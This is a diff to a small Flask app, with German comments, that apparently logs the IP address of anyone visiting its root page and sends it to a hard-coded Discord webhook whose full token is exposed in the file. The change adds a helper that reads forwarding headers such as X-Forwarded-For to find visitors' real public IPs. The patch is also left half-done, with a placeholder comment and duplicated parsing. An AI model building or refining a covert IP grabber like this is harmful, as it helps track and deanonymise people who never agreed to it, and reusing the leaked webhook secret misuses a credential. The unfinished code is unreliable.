@@ -7,10 +7,26 @@ app = Flask(__name__)
 
 WEBHOOK_URL = "https://discord.com/api/webhooks/1527305360539517031/X78P4aN1u9gSLbo9mAHZkaDQTNJN-boj4e8eabaARIAFhVMgEw-1YZVpXNXeJxgQNGqQ"
 
+def get_client_ip(request):
+    # Alle möglichen Header durchgehen
+    headers = [
+        'X-Forwarded-For',
+        'X-Real-IP',
+        'CF-Connecting-IP',  # Falls Cloudflare
+        'True-Client-IP'
+    ]
+    for header in headers:
+        value = request.headers.get(header)
+        if value:
+            ip = value.split(',')[0].strip()
+            if ip and not ip.startswith(('10.', '172.16.', '192.168.', '127.')):
+                return ip
+    return request.remote_addr or 'Unknown'
+
 @app.route('/')
 def log_ip():
-    # Bessere IP-Extraktion
-    ip = None
+    ip = get_client_ip(request)
+    # ... rest wie vorher
     forwarded = request.headers.get('X-Forwarded-For')
     if forwarded:
         ips = [x.strip() for x in forwarded.split(',')]
